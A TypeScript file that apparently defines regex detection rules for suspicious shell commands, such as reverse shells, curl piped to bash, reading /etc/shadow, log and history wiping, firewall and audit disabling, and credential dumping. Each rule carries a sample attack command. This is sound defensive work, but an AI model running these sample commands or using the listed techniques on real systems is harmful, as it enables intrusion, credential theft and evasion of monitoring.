import type { SecurityRule } from './securityRules.ts'

type SecurityBehaviorRule = readonly [
    id: string,
    name: string,
    severity: SecurityRule['severity'],
    pattern: string,
    positive: string,
    negative: string,
]

const definitions: SecurityBehaviorRule[] = [
    [
        'tool_download', 'Security tool download', 'critical',
        '\\b(?:curl|wget|invoke-webrequest|iwr)\\b.*\\b(?:bloodhound|sharphound|xmrig|mimikatz|linpeas|winpeas|chisel|ligolo|rubeus|secretsdump)\\b',
        'curl https://example.test/BloodHound.zip', 'curl https://example.test/health',
    ],
    [
        'pipe_shell', 'Download piped to shell', 'critical',
        '\\b(?:curl|wget)\\b[^\\n]*\\|\\s*(?:sudo\\s+)?(?:sh|bash|zsh)\\b',
        'curl https://example.test/install | bash', 'curl https://example.test/health',
    ],
    [
        'reverse_shell', 'Shell network redirection', 'critical',
        '(?:/dev/tcp/|\\b(?:nc|ncat|netcat)\\b.*\\s-[^\\s]*e\\s|socket\\.socket\\(.*(?:dup2|subprocess))',
        'bash -i > /dev/tcp/192.0.2.1/4444', 'cat /etc/hosts',
    ],
    [
        'shadow_read', 'Password hash file access', 'critical',
        '\\b(?:cat|head|tail|cp|scp|tar)\\b.*(?:/etc/(?:shadow|gshadow)|/SAM\\b|/NTDS\\.dit\\b)',
        'cat /etc/shadow', 'cat /etc/os-release',
    ],
    [
        'history_clear', 'Shell history removal', 'high',
        '(?:\\bhistory\\s+-c\\b|\\b(?:rm|truncate)\\b.*(?:bash_history|zsh_history)|HISTFILE\\s*=\\s*/dev/null)',
        'history -c', 'history',
    ],
    [
        'logs_clear', 'Audit or system log removal', 'critical',
        '\\b(?:rm|truncate|shred)\\b.*(?:/var/log/|audit\\.log)',
        'truncate -s 0 /var/log/auth.log', 'tail /var/log/auth.log',
    ],
    [
        'audit_disable', 'Audit collection disabled', 'critical',
        '(?:\\bauditctl\\s+-(?:e\\s+0|D)\\b|\\b(?:systemctl|service)\\s+(?:stop|disable)\\s+(?:auditd|rsyslog)\\b)',
        'auditctl -e 0', 'auditctl -s',
    ],
    [
        'firewall_disable', 'Firewall disabled', 'critical',
        '(?:\\bufw\\s+disable\\b|\\biptables\\s+-F\\b|\\bnft\\s+flush\\s+ruleset\\b)',
        'ufw disable', 'ufw status',
    ],
    [
        'suid_set', 'Set-user-ID permission change', 'high',
        '\\bchmod\\b.*(?:\\bu\\+s\\b|\\b[2467][0-7]{3}\\b)',
        'chmod 4755 /tmp/tool', 'chmod 644 /tmp/readme',
    ],
    [
        'authorized_keys', 'SSH authorized key modification', 'high',
        '(?:\\b(?:tee|cp|mv|sed)\\b.*authorized_keys|>>?\\s*[^\\s]*authorized_keys)',
        'tee /root/.ssh/authorized_keys', 'cat /root/.ssh/authorized_keys',
    ],
    [
        'cron_write', 'Scheduled command modification', 'high',
        '(?:\\bcrontab\\s+-(?:e|r)\\b|\\b(?:tee|cp|mv)\\b.*(?:/etc/cron|/var/spool/cron))',
        'crontab -e', 'crontab -l',
    ],
    [
        'base64_exec', 'Encoded command execution', 'critical',
        '(?:\\bpowershell\\b.*\\s-(?:enc|encodedcommand)\\b|\\bbase64\\s+(?:-d|--decode)\\b.*\\|\\s*(?:bash|sh)\\b)',
        'powershell -EncodedCommand AAAA', 'base64 report.txt',
    ],
    [
        'credential_dump', 'Windows credential dump', 'critical',
        '(?:\\breg\\s+save\\s+hklm\\\\(?:sam|security|system)\\b|\\bcomsvcs\\.dll\\b.*\\bMiniDump\\b)',
        'reg save HKLM\\SAM C:\\dump', 'reg query HKLM\\Software',
    ],
    [
        'docker_socket', 'Container host control socket access', 'high',
        '\\b(?:curl|docker)\\b.*(?:docker\\.sock|--privileged\\b)',
        'docker run --privileged alpine', 'docker ps',
    ],
]

export const securityBehaviorRules: SecurityRule[] = definitions.map(([id, name, severity, pattern, positive, negative]) => ({
    id: `process.behavior.${id}.v1`,
    name,
    family: 'Command behavior',
    severity,
    explanation: `${name} observed in an executed command. Inspect the command, user, host, and related events.`,
    pattern,
    field: 'command',
    positive,
    negative,
}))
